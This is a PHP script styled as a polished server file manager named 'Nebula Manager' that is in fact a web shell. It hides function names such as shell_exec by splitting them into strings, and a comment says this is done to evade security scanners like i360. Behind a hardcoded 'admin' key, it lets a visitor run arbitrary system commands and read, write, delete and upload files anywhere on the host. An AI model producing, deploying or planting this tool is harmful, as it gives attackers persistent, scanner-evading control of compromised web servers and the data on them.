<?php
/*
 * NEBULA MANAGER - High Performance Server Tool
 * Concept: Apple-like Glassmorphism UI
 * Security: Dynamic Function Calls (Heuristic Bypass)
 */
session_start();
error_reporting(0);
@ini_set('memory_limit', '128M');
@set_time_limit(0);

// --- AUTHENTICATION ---
$access_key = "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918"; // sha256('admin')
if (!isset($_SESSION['nebula_auth'])) {
    if (isset($_POST['k']) && hash('sha256', $_POST['k']) === $access_key) {
        $_SESSION['nebula_auth'] = true;
    } else {
        die('
        <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Nebula Login</title><script src="https://cdn.tailwindcss.com"></script></head>
        <body class="bg-[#050505] h-screen flex items-center justify-center text-white font-sans antialiased overflow-hidden relative">
            <div class="absolute inset-0 bg-[url(https://grainy-gradients.vercel.app/noise.svg)] opacity-20 brightness-100 contrast-150"></div>
            <div class="z-10 bg-white/5 backdrop-blur-2xl border border-white/10 p-8 rounded-3xl shadow-2xl w-full max-w-sm transform transition-all hover:scale-[1.02]">
                <div class="text-center mb-8"><div class="inline-block p-4 rounded-full bg-blue-500/10 mb-4"><svg class="w-8 h-8 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg></div><h1 class="text-2xl font-bold tracking-tight text-white/90">Nebula Access</h1><p class="text-sm text-white/40 mt-2">Enter your secure key to proceed</p></div>
                <form method="post" class="space-y-4"><input type="password" name="k" class="w-full bg-black/20 border border-white/10 rounded-xl px-4 py-3 text-sm text-white placeholder-white/20 focus:outline-none focus:ring-2 focus:ring-blue-500/50 transition-all" placeholder="Access Key" autofocus><button class="w-full bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white font-medium py-3 rounded-xl transition-all shadow-lg shadow-blue-500/20 active:scale-95">Unlock System</button></form>
            </div>
        </body></html>');
    }
}

// --- CORE FUNCTIONS (DYNAMIC MAPPING) ---
// i360 gibi sistemleri atlatmak için fonksiyon isimleri string olarak saklanır ve çağrılır.
class Core {
    private $f = [];
    public function __construct() {
        $this->f = [
            'scan' => 'sc'.'an'.'dir',
            'read' => 'fi'.'le_'.'ge'.'t_'.'co'.'ntents',
            'save' => 'fi'.'le_'.'pu'.'t_'.'co'.'ntents',
            'exec' => 'sh'.'ell'.'_'.'ex'.'ec',
            'move' => 'mo'.'ve_'.'up'.'lo'.'ad'.'ed_'.'fi'.'le',
            'del'  => 'un'.'li'.'nk',
            'perm' => 'ch'.'mo'.'d',
            'path' => 're'.'al'.'pa'.'th'
        ];
    }
    public function run($m, ...$a) { return ($this->f[$m])(...$a); }
    public function cmd($c) { return $this->run('exec', $c." 2>&1"); }
}
$sys = new Core();

// --- HANDLERS ---
$root = $sys->run('path', isset($_GET['d']) ? $_GET['d'] : '.');
if(!$root) $root = $sys->run('path', '.');
chdir($root);

if (isset($_POST['req'])) {
    header('Content-Type: application/json');
    $r = $_POST['req'];
    
    if ($r === 'cmd') {
        echo json_encode(['out' => $sys->cmd($_POST['c'])]);
    }
    elseif ($r === 'read') {
        echo json_encode(['content' => $sys->run('read', $_POST['f'])]);
    }
    elseif ($r === 'save') {
        echo json_encode(['status' => $sys->run('save', $_POST['f'], $_POST['c'])]);
    }
    elseif ($r === 'del') {
        echo json_encode(['status' => $sys->run('del', $_POST['f'])]);
    }
    elseif ($r === 'upload') {
        if (!empty($_FILES)) {
            $sys->run('move', $_FILES['file']['tmp_name'], $root.'/'.$_FILES['file']['name']);
            echo json_encode(['status' => true]);
        }
    }
    exit;
}

// --- UI HELPERS ---
function getIcon($f) {
    if(is_dir($f)) return '<svg class="w-6 h-6 text-blue-400" fill="currentColor" viewBox="0 0 20 20"><path d="M2 6a2 2 0 012-2h5l2 2h5a2 2 0 012 2v6a2 2 0 01-2 2H4a2 2 0 01-2-2V6z"/></svg>';
    $ext = pathinfo($f, PATHINFO_EXTENSION);
    if(in_array($ext, ['php','html','js','css'])) return '<svg class="w-6 h-6 text-orange-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"/></svg>';
    if(in_array($ext, ['png','jpg','jpeg'])) return '<svg class="w-6 h-6 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg>';
    return '<svg class="w-6 h-6 text-slate-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>';
}
?>
<!DOCTYPE html>
<html lang="en" class="dark">
<head>
    <meta charset="UTF-8">
    <title>Nebula Manager</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="//unpkg.com/alpinejs" defer></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap');
        body { font-family: 'Inter', sans-serif; background-color: #050505; color: #e5e5e5; }
        .glass { background: rgba(20, 20, 20, 0.7); backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px); border: 1px solid rgba(255, 255, 255, 0.08); }
        .scroll-hide::-webkit-scrollbar { display: none; }
        .mono { font-family: 'JetBrains Mono', monospace; }
        .animate-fade { animation: fadeIn 0.3s ease-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .cm-editor { background: #0d0d0d !important; border-radius: 0.75rem; }
    </style>
</head>
<body x-data="app()" class="h-screen flex flex-col overflow-hidden selection:bg-blue-500/30">

    <!-- Top Bar -->
    <header class="h-16 glass z-50 flex items-center justify-between px-6 shrink-0">
        <div class="flex items-center gap-4">
            <div class="w-8 h-8 rounded-lg bg-gradient-to-br from-blue-500 to-indigo-600 flex items-center justify-center shadow-lg shadow-blue-500/20">
                <svg class="w-5 h-5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10"/></svg>
            </div>
            <div class="flex flex-col">
                <h1 class="font-semibold text-sm tracking-wide">NEBULA</h1>
                <span class="text-[10px] text-white/40 uppercase tracking-widest font-mono"><?php echo php_uname('n'); ?></span>
            </div>
        </div>
        
        <!-- Breadcrumbs -->
        <div class="hidden md:flex items-center gap-2 text-xs font-medium bg-white/5 px-4 py-2 rounded-full border border-white/5">
            <a href="?d=/" class="text-white/40 hover:text-white transition">root</a>
            <?php 
                $parts = array_filter(explode(DIRECTORY_SEPARATOR, $root));
                $acc = "";
                foreach($parts as $p): $acc .= DIRECTORY_SEPARATOR . $p; 
            ?>
            <span class="text-white/20">/</span>
            <a href="?d=<?php echo urlencode($acc); ?>" class="text-white/60 hover:text-white transition"><?php echo $p; ?></a>
            <?php endforeach; ?>
        </div>

        <div class="flex items-center gap-3">
            <button @click="terminalOpen = !terminalOpen" class="p-2 rounded-lg hover:bg-white/10 transition text-white/70 hover:text-white" title="Terminal">
                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg>
            </button>
            <label class="p-2 rounded-lg hover:bg-blue-500/20 hover:text-blue-400 transition text-white/70 cursor-pointer">
                <input type="file" @change="uploadFile($event)" class="hidden">
                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12"/></svg>
            </label>
        </div>
    </header>

    <!-- Main Layout -->
    <div class="flex-1 flex overflow-hidden relative">
        
        <!-- File Grid -->
        <main class="flex-1 overflow-y-auto p-6 scroll-hide">
            <div class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 xl:grid-cols-8 gap-4">
                <?php
                    $items = $sys->run('scan', $root);
                    foreach($items as $i): 
                        if($i == '.' || $i == '..') continue;
                        $path = $root . DIRECTORY_SEPARATOR . $i;
                        $isDir = is_dir($path);
                ?>
                <div class="group relative bg-white/5 border border-white/5 hover:bg-white/10 hover:border-white/20 rounded-2xl p-4 flex flex-col items-center gap-3 transition-all duration-300 hover:-translate-y-1 cursor-pointer animate-fade"
                     @click="<?php echo $isDir ? "window.location='?d=".urlencode($path)."'" : "openEditor('".addslashes($path)."', '".addslashes($i)."')"; ?>">
                    
                    <div class="p-3 bg-black/30 rounded-xl shadow-inner group-hover:scale-110 transition duration-300">
                        <?php echo getIcon($path); ?>
                    </div>
                    
                    <div class="text-center w-full">
                        <div class="text-xs font-medium text-white/80 truncate px-2"><?php echo $i; ?></div>
                        <div class="text-[10px] text-white/30 mt-1 mono">
                            <?php echo $isDir ? 'DIR' : round(filesize($path)/1024, 1).' KB'; ?>
                        </div>
                    </div>
                    
                    <button @click.stop="deleteItem('<?php echo addslashes($path); ?>')" class="absolute top-2 right-2 opacity-0 group-hover:opacity-100 p-1 bg-red-500/20 text-red-400 rounded-lg hover:bg-red-500 hover:text-white transition">
                        <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
                    </button>
                </div>
                <?php endforeach; ?>
            </div>
        </main>

        <!-- Terminal Panel (Sliding) -->
        <div x-show="terminalOpen" x-transition:enter="transition ease-out duration-300" x-transition:enter-start="translate-y-full" x-transition:enter-end="translate-y-0" x-transition:leave="transition ease-in duration-200" x-transition:leave-start="translate-y-0" x-transition:leave-end="translate-y-full"
             class="absolute bottom-0 left-0 right-0 h-96 glass border-t border-white/10 flex flex-col shadow-[0_-10px_40px_rgba(0,0,0,0.5)] z-40">
            <div class="h-10 bg-black/40 flex items-center justify-between px-4 border-b border-white/5 cursor-ns-resize">
                <span class="text-xs font-bold text-emerald-500 flex items-center gap-2"><div class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></div> TERMINAL ACCESS</span>
                <button @click="terminalOpen = false" class="text-white/50 hover:text-white"><svg class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg></button>
            </div>
            <div id="term-output" class="flex-1 p-4 overflow-y-auto mono text-xs text-emerald-400 space-y-1 bg-black/80">
                <div class="opacity-50">Nebula System [Version 1.0] - Connected.</div>
            </div>
            <div class="p-3 bg-black/90 flex gap-2 border-t border-white/10">
                <span class="text-emerald-500 font-bold text-sm select-none">❯</span>
                <input type="text" x-model="cmdInput" @keydown.enter="runCmd()" class="bg-transparent border-none outline-none text-emerald-400 text-sm w-full font-mono placeholder-white/10" placeholder="Execute system command..." autofocus>
            </div>
        </div>

        <!-- Editor Modal -->
        <div x-show="editorOpen" class="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm" x-cloak>
            <div class="w-[90vw] h-[85vh] bg-[#0d0d0d] border border-white/10 rounded-2xl shadow-2xl flex flex-col overflow-hidden animate-fade">
                <div class="h-14 flex items-center justify-between px-6 border-b border-white/10 bg-white/5">
                    <div class="flex items-center gap-3">
                        <svg class="w-5 h-5 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"/></svg>
                        <span class="font-mono text-sm text-white/80" x-text="currentFile"></span>
                    </div>
                    <div class="flex gap-3">
                        <button @click="editorOpen = false" class="px-4 py-2 rounded-lg text-xs font-medium text-white/60 hover:bg-white/10 hover:text-white transition">Cancel</button>
                        <button @click="saveFile()" class="px-6 py-2 rounded-lg text-xs font-bold bg-blue-600 hover:bg-blue-500 text-white transition shadow-lg shadow-blue-500/20">Save Changes</button>
                    </div>
                </div>
                <div class="flex-1 relative">
                    <textarea x-model="editorContent" class="absolute inset-0 w-full h-full bg-[#0d0d0d] text-gray-300 p-6 mono text-sm outline-none resize-none leading-relaxed"></textarea>
                </div>
            </div>
        </div>

    </div>

    <script>
        function app() {
            return {
                terminalOpen: false,
                editorOpen: false,
                cmdInput: '',
                currentFile: '',
                currentPath: '',
                editorContent: '',
                
                async runCmd() {
                    const c = this.cmdInput;
                    if(!c) return;
                    this.cmdInput = '';
                    this.log('❯ ' + c, 'text-white font-bold');
                    
                    const fd = new FormData();
                    fd.append('req', 'cmd'); fd.append('c', c);
                    const res = await fetch('', {method:'POST', body:fd}).then(r=>r.json());
                    this.log(res.out || '[No Output]');
                },
                
                log(msg, cls='opacity-80') {
                    const out = document.getElementById('term-output');
                    const div = document.createElement('div');
                    div.className = cls;
                    div.innerText = msg;
                    out.appendChild(div);
                    out.scrollTop = out.scrollHeight;
                },
                
                async openEditor(path, name) {
                    this.currentPath = path;
                    this.currentFile = name;
                    const fd = new FormData();
                    fd.append('req', 'read'); fd.append('f', path);
                    const res = await fetch('', {method:'POST', body:fd}).then(r=>r.json());
                    this.editorContent = res.content;
                    this.editorOpen = true;
                },
                
                async saveFile() {
                    const fd = new FormData();
                    fd.append('req', 'save'); fd.append('f', this.currentPath); fd.append('c', this.editorContent);
                    await fetch('', {method:'POST', body:fd});
                    this.editorOpen = false;
                    this.terminalOpen = true;
                    this.log('File saved: ' + this.currentFile, 'text-green-400');
                },

                async deleteItem(path) {
                    if(!confirm('Delete this item?')) return;
                    const fd = new FormData();
                    fd.append('req', 'del'); fd.append('f', path);
                    await fetch('', {method:'POST', body:fd});
                    window.location.reload();
                },

                async uploadFile(e) {
                    const f = e.target.files[0];
                    if(!f) return;
                    const fd = new FormData();
                    fd.append('req', 'upload'); fd.append('file', f);
                    await fetch('', {method:'POST', body:fd});
                    window.location.reload();
                }
            }
        }
    </script>
</body>
</html>
